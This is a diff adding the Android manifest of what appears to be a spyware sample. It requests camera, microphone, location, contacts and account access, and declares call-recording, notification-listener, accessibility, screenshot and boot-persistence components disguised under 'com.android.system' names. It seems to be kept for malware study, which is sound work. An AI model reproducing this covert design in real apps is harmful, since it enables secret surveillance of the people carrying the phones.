@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="it.nv.wat" platformBuildVersionCode="509" platformBuildVersionName="5.0.9">
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <application android:allowBackup="true" android:icon="@drawable/launcher" android:label="@string/app_name" android:name="com.android.system.CoreApp" android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+        <activity android:label="@string/title_activity_start" android:name="com.android.system.StartActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.system.services.intent.PERMISSIONS_GRANTED"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:name="com.android.system.PermissionActivity" android:theme="@style/AppTheme.Transparent"/>
+        <meta-data android:name="io.fabric.ApiKey" android:value="ad9e3a4e087d3640bb7834fcbcb1c5db22******"/> <!-- TRUNCATED FOR PRIVACY -->
+        <receiver android:enabled="true" android:name="com.android.system.BootBroadcast">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.system.BatteryLevelReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_BATTERY_LOW"/>
+                <action android:name="android.intent.action.ACTION_BATTERY_OKAY"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.system.SyncAndFlushReceiver"/>
+        <receiver android:name="com.android.system.LocationReceiver"/>
+        <receiver android:name="com.android.system.ActivationReceiver"/>
+        <receiver android:name="com.android.system.FileSystemScanReceiver"/>
+        <receiver android:name="com.android.system.AppListReceiver"/>
+        <receiver android:name="com.android.system.ContactsReceiver"/>
+        <receiver android:name="com.android.system.PlannedRecTrigger"/>
+        <receiver android:name="com.android.system.SyncDeviceInfoReceiver"/>
+        <receiver android:name="com.android.system.RecordCallService$RestartRecReceiver"/>
+        <receiver android:name="com.android.system.SimStateReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIM_STATE_CHANGED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.system.mqtt.MqttKeepAlive"/>
+        <receiver android:enabled="true" android:exported="true" android:name="com.android.system.ScreenReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.system.InOutCallsReceiver">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.PHONE_STATE"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.system.PowerConnectionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.system.ProxyChangeReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PROXY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="Ambient" android:name="com.android.system.AmbientService"/>
+        <service android:name="com.app.system.common.service.EventsAndReceiveService"/>
+        <service android:label="Location" android:name="com.android.system.LocationService"/>
+        <service android:label="Record" android:name="com.android.system.RecordCallService"/>
+        <service android:name="com.app.system.common.service.RootPermissionService"/>
+        <service android:label="Core" android:name="com.android.system.CoreService"/>
+        <service android:label="Scan" android:name="com.android.system.ScanAppService" android:process=":remote"/>
+        <service android:enabled="true" android:exported="true" android:label="Android Notifications System" android:name="com.app.system.common.service.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:label="Mqtt" android:name="org.eclipse.paho.android.service.MqttService"/>
+        <service android:label="@string/accessibility_service_description" android:name="com.android.system.MyAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
+        </service>
+        <service android:enabled="true" android:exported="true" android:name="com.app.system.common.CameraService"/>
+        <service android:enabled="true" android:exported="true" android:name="com.app.system.common.ScreenshotService"/>
+        <meta-data android:name="android.support.VERSION" android:value="26.1.0"/>
+        <provider android:authorities="it.nv.wat.crashlyticsinitprovider" android:exported="false" android:initOrder="90" android:name="com.crashlytics.android.CrashlyticsInitProvider"/>
+        <meta-data android:name="android.arch.lifecycle.VERSION" android:value="27.0.0-SNAPSHOT"/>
+    </application>
+</manifest>
